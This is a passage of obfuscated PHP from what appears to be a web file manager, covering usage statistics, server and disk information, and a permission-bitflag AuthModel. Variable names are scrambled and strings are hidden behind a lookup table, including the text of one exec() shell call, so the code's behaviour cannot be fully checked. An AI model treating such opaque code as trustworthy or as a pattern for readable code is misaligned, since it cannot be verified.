$–‹šë¾ì”‡ÇÈ = strtotime($È´Ì•Û§­Í—[1676]); $˜íÕ˜¶ = array(); while ($Áƒ–¹¤€—Ï  <= $–‹šë¾ì”‡ÇÈ) { $˜íÕ˜¶[] = date($È´Ì•Û§­Í—[1675], $Áƒ–¹¤€—Ï ); $Áƒ–¹¤€—Ï  = strtotime($È´Ì•Û§­Í—[1678], $Áƒ–¹¤€—Ï ); } return $˜íÕ˜¶; } public function _recordUser($é = '') { $¯ÀïŸ =& $_SERVER[ÀÆ]; $ğıïÖ¨Ğµ = strtotime(date($¯ÀïŸ[1679], strtotime($é))); $Ú¦½ = strtotime(date($¯ÀïŸ[1680], strtotime($é))); $ò“¥€‹Š… = array($¯ÀïŸ[194] => array($¯ÀïŸ[1004], $Ú¦½)); $ˆó¿Ÿ = Model($¯ÀïŸ[532])->where($ò“¥€‹Š…)->count($¯ÀïŸ[1572]); $ò“¥€‹Š…[$¯ÀïŸ[194]] = array($¯ÀïŸ[331], array($ğıïÖ¨Ğµ, $Ú¦½)); $ƒÏ½Æß½¿ = Model($¯ÀïŸ[532])->where($ò“¥€‹Š…)->count($¯ÀïŸ[1572]); $ò“¥€‹Š…[$¯ÀïŸ[29]] = $¯ÀïŸ[1681]; $ˆã³ëö‘Ÿ“ = Model($¯ÀïŸ[1682])->where($ò“¥€‹Š…)->count($¯ÀïŸ[1683]); $ÁÆœ‰çØ¯²è = array($¯ÀïŸ[222] => $é, $¯ÀïŸ[750] => (int) $ˆó¿Ÿ, $¯ÀïŸ[1668] => (int) $ƒÏ½Æß½¿, $¯ÀïŸ[1669] => (int) $ˆã³ëö‘Ÿ“); return $this->insert($ÁÆœ‰çØ¯²è); } public function _recordStore($ıÅŒÃö—£è = '') { $Ä—â½¼ñŒ =& $_SERVER[ÀÆ]; $ıÔÈÜ€ëÀ¦ = strtotime(date($Ä—â½¼ñŒ[1680], strtotime($ıÅŒÃö—£è))); $¬•§„¦ÊÖ‰— = array($Ä—â½¼ñŒ[194] => array($Ä—â½¼ñŒ[1004], $ıÔÈÜ€ëÀ¦)); $øÁ‘óÕ“ = Model($Ä—â½¼ñŒ[464])->where($¬•§„¦ÊÖ‰—)->sum($Ä—â½¼ñŒ[78]); $¬•§„¦ÊÖ‰—[$Ä—â½¼ñŒ[405]] = 0; $Ø½ÔÕ¬Š£î = Model($Ä—â½¼ñŒ[817])->where($¬•§„¦ÊÖ‰—)->sum($Ä—â½¼ñŒ[78]); $¬•§„¦ÊÖ‰—[$Ä—â½¼ñŒ[406]] = 1; $¦¤ã¸­˜ˆ = Model($Ä—â½¼ñŒ[817])->where($¬•§„¦ÊÖ‰—)->sum($Ä—â½¼ñŒ[78]); $¬•§„¦ÊÖ‰—[$Ä—â½¼ñŒ[406]] = 2; $ÁÒ‰ = Model($Ä—â½¼ñŒ[817])->where($¬•§„¦ÊÖ‰—)->sum($Ä—â½¼ñŒ[78]); $Üı = array($Ä—â½¼ñŒ[222] => $ıÅŒÃö—£è, $Ä—â½¼ñŒ[748] => (int) $Ø½ÔÕ¬Š£î, $Ä—â½¼ñŒ[1672] => (int) $øÁ‘óÕ“, $Ä—â½¼ñŒ[1673] => (int) $¦¤ã¸­˜ˆ, $Ä—â½¼ñŒ[1674] => (int) $ÁÒ‰); return $this->insert($Üı); } public function trend($Ìœ¼¶­Ó‡è, $ß¾™şÚ÷Ì••) { $ÙĞÑ©ìô¿£ =& $_SERVER[ÀÆ]; if (!$this->init($Ìœ¼¶­Ó‡è)) { return !1; } $“ş©¾Ê¨Ò = $this->trendList($Ìœ¼¶­Ó‡è); if ($“ş©¾Ê¨Ò && $ß¾™şÚ÷Ì•• != $ÙĞÑ©ìô¿£[1545]) { $™ = $“ş©¾Ê¨Ò[0][$ÙĞÑ©ìô¿£[222]]; $íî = $this->validDate($ß¾™şÚ÷Ì••, $™); $ãµ¯§Âù = array(); $ûØÌÃ‘á¸ = array_to_keyvalue($“ş©¾Ê¨Ò, $ÙĞÑ©ìô¿£[222]); foreach ($íî as $öİû™Ã™ô) { if (isset($ûØÌÃ‘á¸[$öİû™Ã™ô])) { $ÓÊ¤¶ìŒ¢Ú¬Õ = $ûØÌÃ‘á¸[$öİû™Ã™ô]; } else { $ÓÊ¤¶ìŒ¢Ú¬Õ = end($“ş©¾Ê¨Ò); $ÓÊ¤¶ìŒ¢Ú¬Õ[$ÙĞÑ©ìô¿£[222]] = $öİû™Ã™ô; if ($Ìœ¼¶­Ó‡è == $ÙĞÑ©ìô¿£[588]) { $ÓÊ¤¶ìŒ¢Ú¬Õ[$ÙĞÑ©ìô¿£[1668]] = $ÓÊ¤¶ìŒ¢Ú¬Õ[$ÙĞÑ©ìô¿£[1669]] = 0; } } $ãµ¯§Âù[] = $ÓÊ¤¶ìŒ¢Ú¬Õ; } $“ş©¾Ê¨Ò = $ãµ¯§Âù; } $»µË±…©† = array($ÙĞÑ©ìô¿£[588] => array($ÙĞÑ©ìô¿£[750] => LNG($ÙĞÑ©ìô¿£[1684]), $ÙĞÑ©ìô¿£[1668] => LNG($ÙĞÑ©ìô¿£[1685]), $ÙĞÑ©ìô¿£[1669] => LNG($ÙĞÑ©ìô¿£[1686])), $ÙĞÑ©ìô¿£[1670] => array($ÙĞÑ©ìô¿£[748] => LNG($ÙĞÑ©ìô¿£[1687]), $ÙĞÑ©ìô¿£[1672] => LNG($ÙĞÑ©ìô¿£[1688]), $ÙĞÑ©ìô¿£[1673] => LNG($ÙĞÑ©ìô¿£[1689]), $ÙĞÑ©ìô¿£[1674] => LNG($ÙĞÑ©ìô¿£[1690]))); $Ÿ¾ = array($ÙĞÑ©ìô¿£[588] => $ÙĞÑ©ìô¿£[1691], $ÙĞÑ©ìô¿£[1670] => $ÙĞÑ©ìô¿£[78]); if (empty($“ş©¾Ê¨Ò)) { $öİû™Ã™ô = date($ÙĞÑ©ìô¿£[1675], strtotime($ÙĞÑ©ìô¿£[1676])); $¯ğ—–ŞÒ = array($ÙĞÑ©ìô¿£[222] => $öİû™Ã™ô); foreach ($»µË±…©†[$Ìœ¼¶­Ó‡è] as $œ => $Úéê) { $¯ğ—–ŞÒ[$œ] = 0; } $“ş©¾Ê¨Ò[] = $¯ğ—–ŞÒ; } $Ìä±®Ææò” = array(); foreach ($“ş©¾Ê¨Ò as $Úéê) { if ($Ìœ¼¶­Ó‡è == $ÙĞÑ©ìô¿£[1670] && $Úéê[$ÙĞÑ©ìô¿£[1672]] > $Úéê[$ÙĞÑ©ìô¿£[748]]) { $Úéê[$ÙĞÑ©ìô¿£[1672]] = $Úéê[$ÙĞÑ©ìô¿£[748]]; } foreach ($»µË±…©†[$Ìœ¼¶­Ó‡è] as $œ => $“€) { $ÓÊ¤¶ìŒ¢Ú¬Õ = array($ÙĞÑ©ìô¿£[222] => $Úéê[$ÙĞÑ©ìô¿£[222]], $ÙĞÑ©ìô¿£[1474] => $“€); $ÓÊ¤¶ìŒ¢Ú¬Õ[$Ÿ¾[$Ìœ¼¶­Ó‡è]] = isset($Úéê[$œ]) ? $Úéê[$œ] : 0; $Ìä±®Ææò”[] = $ÓÊ¤¶ìŒ¢Ú¬Õ; } } return $Ìä±®Ææò”; } public function validDate($Î¥Ì‘›, $ŸŒ…Ÿ) { $„­¯ =& $_SERVER[ÀÆ]; $Ù°´ÈÉ£Í = date($„­¯[1675], strtotime($„­¯[1676])); $®±  = array($Ù°´ÈÉ£Í); switch ($Î¥Ì‘›) { case $„­¯[1552]: $ÊàŠİò = mktime(0, 0, 0, date($„­¯[1692]), date($„­¯[1297]) - date($„­¯[1358]) + 7 - 7, date($„­¯[1693])); $ï•ã¯Àº‹ì‚† = 0; do { $®õú ë‚¾ãÏ = date($„­¯[1675], $ÊàŠİò - 3600 * 24 * 7 * $ï•ã¯Àº‹ì‚†); $®± [] = $®õú ë‚¾ãÏ; $ï•ã¯Àº‹ì‚†++; } while ($ŸŒ…Ÿ < $®õú ë‚¾ãÏ); break; case $„­¯[1550]: $ï•ã¯Àº‹ì‚† = 1; do { $¨Ô‹Ü = date($„­¯[1694], strtotime("\x2d\40{$ï•ã¯Àº‹ì‚†}\40\155\157\156\164\150\x73")); $®± [] = $¨Ô‹Ü; $ï•ã¯Àº‹ì‚†++; } while ($ŸŒ…Ÿ < $¨Ô‹Ü); break; case $„­¯[1695]: $®Ş¸ñ§Şá = (int) date($„­¯[1693], strtotime($ŸŒ…Ÿ)); $ÀíÒ„ = (int) date($„­¯[1693]); if ($®Ş¸ñ§Şá >= $ÀíÒ„) { break; } for ($®Ş¸ñ§Şá; $®Ş¸ñ§Şá < $ÀíÒ„; $®Ş¸ñ§Şá++) { $®± [] = $®Ş¸ñ§Şá . $„­¯[1696]; } break; default: break; } if ($ŸŒ…Ÿ > end($®± )) { array_pop($®± ); } sort($®± ); return $®± ; } public function listTable($°©) { $İİ«íö = ucfirst($°©); return Model($İİ«íö)->listData(); } public function option($ÉŞ˜’) { $ò¾İÇş = $_SERVER[ÀÆ][1697] . ucfirst($ÉŞ˜’); return $this->{$ò¾İÇş}(); } private function optionUser() { $ÊÊ©»Û· =& $_SERVER[ÀÆ]; $·‘Šè = Model($ÊÊ©»Û·[532])->count($ÊÊ©»Û·[1572]); $¿ù = Model($ÊÊ©»Û·[532])->where($ÊÊ©»Û·[1698])->count($ÊÊ©»Û·[1572]); $ïê¹ı× = intval($GLOBALS[$ÊÊ©»Û·[6]][$ÊÊ©»Û·[347]][$ÊÊ©»Û·[1531]]) / 3600; $áò›Ë = strtotime("\55{$ïê¹ı×}\40\150\x6f\165\162\x73"); $ˆäïˆ¸†¥¯İ = strtotime(date($ÊÊ©»Û·[1679])); if ($áò›Ë < $ˆäïˆ¸†¥¯İ) { $áò›Ë = $ˆäïˆ¸†¥¯İ; } $°ØÊËã±÷˜Ú = array($ÊÊ©»Û·[1699] => array($ÊÊ©»Û·[1005], $áò›Ë)); $çìƒ« = (int) Model($ÊÊ©»Û·[532])->where($°ØÊËã±÷˜Ú)->count($ÊÊ©»Û·[1572]); if (!$çìƒ«) { $çìƒ« = 1; } $°ØÊËã±÷˜Ú = array($ÊÊ©»Û·[1699] => array($ÊÊ©»Û·[1005], $ˆäïˆ¸†¥¯İ)); $Â‹ = Model($ÊÊ©»Û·[532])->where($°ØÊËã±÷˜Ú)->count($ÊÊ©»Û·[1572]); return array($ÊÊ©»Û·[744] => (int) $·‘Šè, $ÊÊ©»Û·[1700] => (int) ($·‘Šè - $¿ù), $ÊÊ©»Û·[1701] => (int) $¿ù, $ÊÊ©»Û·[1702] => (int) $Â‹, $ÊÊ©»Û·[1703] => $çìƒ«); } private function optionFile() { $†Ã¨°‡‡Üõ =& $_SERVER[ÀÆ]; $º¨ÙÅÔº° = $this->sourceSize(); $ºíìÏ¼î = $º¨ÙÅÔº°[$†Ã¨°‡‡Üõ[78]]; $©¥ú÷»–¹‘£ = $º¨ÙÅÔº°[$†Ã¨°‡‡Üõ[1672]]; $Ô­¢ñí = Model($†Ã¨°‡‡Üõ[817])->where(array($†Ã¨°‡‡Üõ[405] => 0))->count($†Ã¨°‡‡Üõ[397]); $üĞ±Ú½éØ® = array($†Ã¨°‡‡Üõ[405] => 0, $†Ã¨°‡‡Üõ[194] => array($†Ã¨°‡‡Üõ[1005], strtotime(date($†Ã¨°‡‡Üõ[1679])))); $«è‰ğ¡õ’ = Model($†Ã¨°‡‡Üõ[817])->where($üĞ±Ú½éØ®)->sum($†Ã¨°‡‡Üõ[78]); $¤Ç¢ÃÓ = Model($†Ã¨°‡‡Üõ[817])->where($üĞ±Ú½éØ®)->count($†Ã¨°‡‡Üõ[397]); return array($†Ã¨°‡‡Üõ[748] => $ºíìÏ¼î, $†Ã¨°‡‡Üõ[1672] => $©¥ú÷»–¹‘£, $†Ã¨°‡‡Üõ[1704] => $ºíìÏ¼î - $©¥ú÷»–¹‘£, $†Ã¨°‡‡Üõ[1705] => (int) $«è‰ğ¡õ’, $†Ã¨°‡‡Üõ[750] => (int) $Ô­¢ñí, $†Ã¨°‡‡Üõ[1706] => (int) $¤Ç¢ÃÓ); } private function optionAccess() { $°£¨­Êè =& $_SERVER[ÀÆ]; return array($°£¨­Êè[744] => $this->typeLogCnt(), $°£¨­Êè[107] => $this->typeLogCnt($°£¨­Êè[107]), $°£¨­Êè[444] => $this->typeLogCnt($°£¨­Êè[444]), $°£¨­Êè[1707] => $this->typeLogCnt($°£¨­Êè[1707]), $°£¨­Êè[1708] => $this->typeLogCnt($°£¨­Êè[1708]), $°£¨­Êè[588] => $this->typeLogCnt($°£¨­Êè[33], $°£¨­Êè[1683])); } private function typeLogCnt($ü¢ç’ö = '', $›¢¶à = "\151\x64") { $úĞß–ïê =& $_SERVER[ÀÆ]; $ñşÍÙ = array($úĞß–ïê[107] => array($úĞß–ïê[1709], $úĞß–ïê[1710]), $úĞß–ïê[444] => array($úĞß–ïê[1711], $úĞß–ïê[1712]), $úĞß–ïê[1707] => array($úĞß–ïê[1713], $úĞß–ïê[1714], $úĞß–ïê[1715]), $úĞß–ïê[1708] => array($úĞß–ïê[1716], $úĞß–ïê[1717]), $úĞß–ïê[1718] => array($úĞß–ïê[1719], $úĞß–ïê[1720], $úĞß–ïê[1721])); $­‹øğËÖ = strtotime(date($úĞß–ïê[1679])); $ØÚû = array($úĞß–ïê[194] => array($úĞß–ïê[1005], $­‹øğËÖ)); if ($ü¢ç’ö) { $ØÚû[$úĞß–ïê[29]] = array($úĞß–ïê[7], $ñşÍÙ[$ü¢ç’ö]); } $¢…½ = Model($úĞß–ïê[1682])->where($ØÚû)->count($›¢¶à); return (int) $¢…½; } private function optionServer() { $Ö˜ =& $_SERVER[ÀÆ]; $óƒ•İõİì† = $this->diskDriver(); $Šï = KodIO::defaultDriver(); $İĞ÷çê×³Æİ = array($Ö˜[809] => $Šï[$Ö˜[395]]); $úçÛ’ŒÛÃ = Model($Ö˜[464])->where($İĞ÷çê×³Æİ)->sum($Ö˜[78]); $‹Ÿá–• = explode($Ö˜[50], $_SERVER[$Ö˜[142]]); $ÑôşÄÚå¨ = $‹Ÿá–•[0]; $âÒµıí = $GLOBALS[$Ö˜[6]][$Ö˜[17]]; $¶­ÃŞˆˆıØ = $âÒµıí[$Ö˜[966]]; if ($¶­ÃŞˆˆıØ == $Ö˜[782]) { $ÙƒĞ = explode($Ö˜[1199], $âÒµıí[$Ö˜[965]]); $¶­ÃŞˆˆıØ = $ÙƒĞ[0]; } if ($¶­ÃŞˆˆıØ == $Ö˜[785] || $¶­ÃŞˆˆıØ == $Ö˜[786]) { $Òâò¬ = Model()->db()->query($Ö˜[1722]); $ŒÍºç¡“ = $Òâò¬[0] && isset($Òâò¬[0][$Ö˜[1473]]) ? $Òâò¬[0][$Ö˜[1473]] : 0; $¶­ÃŞˆˆıØ = $Ö˜[1723] . ($ŒÍºç¡“ ? $Ö˜[8] . $ŒÍºç¡“ : $Ö˜[33]); } $‹îÎ•µ«£ú = $GLOBALS[$Ö˜[6]][$Ö˜[347]][$Ö˜[819]]; return array($Ö˜[1724] => $óƒ•İõİì† ? $óƒ•İõİì†[$Ö˜[1725]] : 0, $Ö˜[1726] => $óƒ•İõİì† ? $óƒ•İõİì†[$Ö˜[1727]] : 0, $Ö˜[1728] => (int) $Šï[$Ö˜[1725]] * 1024 * 1024 * 1024, $Ö˜[1729] => (int) $úçÛ’ŒÛÃ, $Ö˜[1730] => ucfirst($ÑôşÄÚå¨), $Ö˜[1731] => $Ö˜[1732] . PHP_VERSION, $Ö˜[1733] => phpBuild64() ? 64 : 32, $Ö˜[743] => str_replace($Ö˜[1734], $Ö˜[982], $¶­ÃŞˆˆıØ), $Ö˜[347] => ucfirst($‹îÎ•µ«£ú), $Ö˜[28] => $_SERVER[$Ö˜[1735]]); } private function diskDriver() { $ö¸ùÑí’ÎÄ…‰ =& $_SERVER[ÀÆ]; $‘ó = $ö¸ùÑí’ÎÄ…‰[8]; $÷Ÿ¬ößéÆ± = $GLOBALS[$ö¸ùÑí’ÎÄ…‰[6]][$ö¸ùÑí’ÎÄ…‰[1215]] == $ö¸ùÑí’ÎÄ…‰[1216]; if ($÷Ÿ¬ößéÆ±) { $‘ó = $ö¸ùÑí’ÎÄ…‰[1736]; if (function_exists($ö¸ùÑí’ÎÄ…‰[1737])) { exec($ö¸ùÑí’ÎÄ…‰[1738], $èÜ¦†²); $‘ó = $èÜ¦†²[1] . $ö¸ùÑí’ÎÄ…‰[8]; } } if (!file_exists($‘ó)) { return; } $ƒ´©üÊûˆ = @disk_total_space($‘ó); $Ú†Ä”´¢à§ = $ƒ´©üÊûˆ - @disk_free_space($‘ó); return array($ö¸ùÑí’ÎÄ…‰[1725] => $ƒ´©üÊûˆ, $ö¸ùÑí’ÎÄ…‰[1727] => $Ú†Ä”´¢à§); } public function fileChart($Å±) { $Ç§Ø¤Õ• =& $_SERVER[ÀÆ]; if (isset($Å±[$Ç§Ø¤Õ•[1572]])) { return Model($Ç§Ø¤Õ•[817])->userFileTypeProfile($Å±[$Ç§Ø¤Õ•[1572]]); } if (isset($Å±[$Ç§Ø¤Õ•[1739]])) { return Model($Ç§Ø¤Õ•[817])->groupFileTypeProfile($Å±[$Ç§Ø¤Õ•[1739]]); } $¬­™Øá = $this->sourceSize(); $ºÓ = array($Ç§Ø¤Õ•[492] => 0, $Ç§Ø¤Õ•[406] => 1); $ûƒï = Model($Ç§Ø¤Õ•[817])->where($ºÓ)->sum($Ç§Ø¤Õ•[78]); $ºÓ[$Ç§Ø¤Õ•[406]] = 2; $¨ê¶¸ó“›Ë = Model($Ç§Ø¤Õ•[817])->where($ºÓ)->sum($Ç§Ø¤Õ•[78]); return array($Ç§Ø¤Õ•[748] => $¬­™Øá[$Ç§Ø¤Õ•[78]], $Ç§Ø¤Õ•[1672] => $¬­™Øá[$Ç§Ø¤Õ•[1672]], $Ç§Ø¤Õ•[1673] => (int) $ûƒï, $Ç§Ø¤Õ•[1674] => (int) $¨ê¶¸ó“›Ë); } private function sourceSize() { $¦ğâŒüê“Ã =& $_SERVER[ÀÆ]; $ÄİÊ = Model($¦ğâŒüê“Ã[817])->where(array($¦ğâŒüê“Ã[405] => 0))->sum($¦ğâŒüê“Ã[78]); $ãøÌ¤±÷¥ÚÏ‘ = Model($¦ğâŒüê“Ã[464])->sum($¦ğâŒüê“Ã[78]); if ($ãøÌ¤±÷¥ÚÏ‘ > $ÄİÊ) { $ãøÌ¤±÷¥ÚÏ‘ = $ÄİÊ; } return array($¦ğâŒüê“Ã[78] => (int) $ÄİÊ, $¦ğâŒüê“Ã[1672] => (int) $ãøÌ¤±÷¥ÚÏ‘); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $±ÏîÔ™ÈË =& $_SERVER[ÀÆ]; $¢Ğ = array(array($±ÏîÔ™ÈË[415] => LNG($±ÏîÔ™ÈË[1740]), $±ÏîÔ™ÈË[1741] => $±ÏîÔ™ÈË[1742], $±ÏîÔ™ÈË[1743] => 1, $±ÏîÔ™ÈË[1744] => 1, $±ÏîÔ™ÈË[1745] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($±ÏîÔ™ÈË[415] => LNG($±ÏîÔ™ÈË[1746]), $±ÏîÔ™ÈË[1741] => $±ÏîÔ™ÈË[1747], $±ÏîÔ™ÈË[1743] => 2, $±ÏîÔ™ÈË[1744] => 1, $±ÏîÔ™ÈË[1745] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($±ÏîÔ™ÈË[415] => LNG($±ÏîÔ™ÈË[1748]), $±ÏîÔ™ÈË[1741] => $±ÏîÔ™ÈË[1749], $±ÏîÔ™ÈË[1743] => 3, $±ÏîÔ™ÈË[1744] => 1, $±ÏîÔ™ÈË[1745] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($±ÏîÔ™ÈË[415] => LNG($±ÏîÔ™ÈË[1750]), $±ÏîÔ™ÈË[1741] => $±ÏîÔ™ÈË[1751], $±ÏîÔ™ÈË[1743] => 4, $±ÏîÔ™ÈË[1744] => 1, $±ÏîÔ™ÈË[1745] => self::AUTH_SHOW | self::AUTH_VIEW), array($±ÏîÔ™ÈË[415] => LNG($±ÏîÔ™ÈË[1752]), $±ÏîÔ™ÈË[1741] => $±ÏîÔ™ÈË[1753], $±ÏîÔ™ÈË[1743] => 5, $±ÏîÔ™ÈË[1744] => 1, $±ÏîÔ™ÈË[1745] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($±ÏîÔ™ÈË[415] => LNG($±ÏîÔ™ÈË[1754]), $±ÏîÔ™ÈË[1741] => $±ÏîÔ™ÈË[1755], $±ÏîÔ™ÈË[1743] => 6, $±ÏîÔ™ÈË[1744] => 1, $±ÏîÔ™ÈË[1745] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($±ÏîÔ™ÈË[415] => LNG($±ÏîÔ™ÈË[1756]), $±ÏîÔ™ÈË[1741] => $±ÏîÔ™ÈË[1757], $±ÏîÔ™ÈË[1743] => 7, $±ÏîÔ™ÈË[1744] => 1, $±ÏîÔ™ÈË[1745] => 0)); return $¢Ğ; } public static function authCheck($Š•ÅØ×ÏÀ, $İøÌ‘™‘–) { $Š•ÅØ×ÏÀ = intval($Š•ÅØ×ÏÀ); if ($GLOBALS[$_SERVER[ÀÆ][499]]) { return !0; } if ($Š•ÅØ×ÏÀ <= 0) { return !1; } if (($Š•ÅØ×ÏÀ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Š•ÅØ×ÏÀ & $İøÌ‘™‘–); } public static function authCheckShow($»Ñäªì“) { return self::authCheck($»Ñäªì“, self::AUTH_SHOW); } public static function authCheckView($ã­ö) { return self::authCheck($ã­ö, self::AUTH_VIEW); } public static function authCheckDownload($ÇŸ¤‚Ï¢Åê¹) { return self::authCheck($ÇŸ¤‚Ï¢Åê¹, self::AUTH_DOWNLOAD); } public static function authCheckUpload($«Ø×èÓè›) { return self::authCheck($«Ø×èÓè›, self::AUTH_UPLOAD); } public static function authCheckEdit($µ¶Ôğ·Ñ) { return self::authCheck($µ¶Ôğ·Ñ, self::AUTH_EDIT); } public static function authCheckRemove($ÂÀàÂ) { return self::authCheck($ÂÀàÂ, self::AUTH_REMOVE); } public static function authCheckShare($Œ†) { return self::authCheck($Œ†, self::AUTH_SHARE); } public static function authCheckComment($¢“©²) { return self::authCheck($¢“©², self::AUTH_COMMENT); } public static function authCheckEvent($³õÛ) { return self::authCheck($³õÛ, self::AUTH_EVENT); } public static function authCheckRoot($‹é©) { return self::authCheck($‹é©, self::AUTH_ROOT); } public static function authCheckAction($Š¹ìÓÀ”ñ, $Öºà¾) { $ã¾Ö—ÕÀÎ =& $_SERVER[ÀÆ]; $Œ‰ = array($ã¾Ö—ÕÀÎ[1758] => self::AUTH_VIEW, $ã¾Ö—ÕÀÎ[1126] => self::AUTH_DOWNLOAD, $ã¾Ö—ÕÀÎ[107] => self::AUTH_UPLOAD, $ã¾Ö—ÕÀÎ[1708] => self::AUTH_EDIT, $ã¾Ö—ÕÀÎ[1707] => self::AUTH_REMOVE, $ã¾Ö—ÕÀÎ[1718] => self::AUTH_SHARE, $ã¾Ö—ÕÀÎ[352] => self::AUTH_COMMENT, $ã¾Ö—ÕÀÎ[1560] => self::AUTH_EVENT, $ã¾Ö—ÕÀÎ[1759] => self::AUTH_ROOT); if (!isset($Œ‰[$Öºà¾])) { return; } $à•ŸğŒ»ı¤ = $Œ‰[$Öºà¾]; $Š¹ìÓÀ”ñ = intval($Š¹ìÓÀ”ñ); if ($Š¹ìÓÀ”ñ <= 0) { return !1; } if (($Š¹ìÓÀ”ñ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Š¹ìÓÀ”ñ & $à•ŸğŒ»ı¤); } public static function authDisable($ªé§øÜñ…“, $ëÄ»¯¨ñ÷·¼—) { if (intval($ªé§øÜñ…“) <= 0) { return 0; } return intval($ªé§øÜñ…“) & ~$ëÄ»¯¨ñ÷·¼—; } public $optionType = "\x53\x79\163\164\x65\x6d\x2e\x73\157\x75\162\143\145\101\x75\x74\150\114\151\163\x74"; public $field = array("\156\141\155\145", "\141\x75\x74\x68", "\x6c\141\x62\145\154", "\x64\x69\x73\160\154\141\171", "\x73\x79\x73\164\145\x6d", "\x73\157\162\164"); public function initData() { $Æã’È¯·Û« = $this->authDefault(); foreach ($Æã’È¯·Û« as $‚ÑÂ) { $this->add($‚ÑÂ); } } public function findAuth($»çï¬ šÍûï, $…‹à) { $îø¢áı =& $_SERVER[ÀÆ]; $Ê”Ä = parent::listData(); foreach ($Ê”Ä as $©×·ğ‰ó’€¢¿) { $–©í = intval($©×·ğ‰ó’€¢¿[$îø¢áı[408]]); if ($–©í <= 0 || $©×·ğ‰ó’€¢¿[$îø¢áı[1760]] == 0) { continue; } if (($–©í & $»çï¬ šÍûï) != $»çï¬ šÍûï) { continue; } if (($–©í & $…‹à) != 0) { continue; } return $©×·ğ‰ó’€¢¿[$îø¢áı[395]]; } return !1; } public function findAuthReadOnly() { $»©šˆ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $û´Ñí = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($»©šˆ, $û´Ñí); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function listData($ä™ = false, $ˆ‘¨¬×¼› = "\x73\157\162\x74", $¢ÈÌá•¼ÔÜú = false) { return parent::listData($ä™, $ˆ‘¨¬×¼›, $¢ÈÌá•¼ÔÜú); } public function update($äá…, $´”ê´˜İ) { $âªê‡…€´ =& $_SERVER[ÀÆ]; $ëª = parent::listData($äá…); $ë„ÈÇ—’’® = $this->findByName($´”ê´˜İ[$âªê‡…€´[28]]); if (!$ëª || $ë„ÈÇ—’’® && $ë„ÈÇ—’’®[$âªê‡…€´[395]] != $ëª[$âªê‡…€´[395]]) { return !1; } $this->filterAuth($´”ê´˜İ[$âªê‡…€´[408]]); return parent::update($äá…, $´”ê´˜İ); } public function remove($Æ«Ûµª) { $¿ƒÃÛëÍÑÙå = parent::listData($Æ«Ûµª); if (!$¿ƒÃÛëÍÑÙå || $¿ƒÃÛëÍÑÙå[$_SERVER[ÀÆ][1203]]) { return !1; } return parent::remove($Æ«Ûµª); } public function add($‰Äüø…ŸÎÅí = array()) { $×¥ =& $_SERVER[ÀÆ]; if ($this->findByName($‰Äüø…ŸÎÅí[$×¥[28]])) { return !1; } $ãÈÍ“ˆè = array($×¥[28] => $×¥[33], $×¥[408] => 1, $×¥[1761] => $×¥[1749], $×¥[1760] => 1, $×¥[1203] => 0, $×¥[1762] => 0); $‰Äüø…ŸÎÅí = array_merge($ãÈÍ“ˆè, $‰Äüø…ŸÎÅí); $‰Äüø…ŸÎÅí[$×¥[1762]] = $this->getSort(); $this->filterAuth($‰Äüø…ŸÎÅí[$×¥[408]]); return parent::insert($‰Äüø…ŸÎÅí); } private function getSort() { $¿ãÕ =& $_SERVER[ÀÆ]; $¶– = parent::listData(); $€ªÄ¶€åú§§Ÿ = array_to_keyvalue($¶–, $¿ãÕ[33], $¿ãÕ[1762]); return empty($€ªÄ¶€åú§§Ÿ) ? 0 : max($€ªÄ¶€åú§§Ÿ) + 1; } private function filterAuth(&$ˆ†ÓÕ€) { if (!$ˆ†ÓÕ€) { return; } $÷Ô§¬â = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $·ÖÁêÒ = array(); foreach ($÷Ô§¬â as $—™çó¾÷ÌÚŸ•) { if ($ˆ†ÓÕ€ & $—™çó¾÷ÌÚŸ•) { $·ÖÁêÒ[] = $—™çó¾÷ÌÚŸ•; } } if (in_array(self::AUTH_ROOT, $·ÖÁêÒ)) { $ˆ†ÓÕ€ = array_sum($÷Ô§¬â); return; } $²Ç§·‘±œÀ¿¹ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($·ÖÁêÒ as $—™çó¾÷ÌÚŸ•) { if (isset($²Ç§·‘±œÀ¿¹[$—™çó¾÷ÌÚŸ•])) { $·ÖÁêÒ = array_merge($·ÖÁêÒ, $²Ç§·‘±œÀ¿¹[$—™çó¾÷ÌÚŸ•]); } } $·ÖÁêÒ[] = 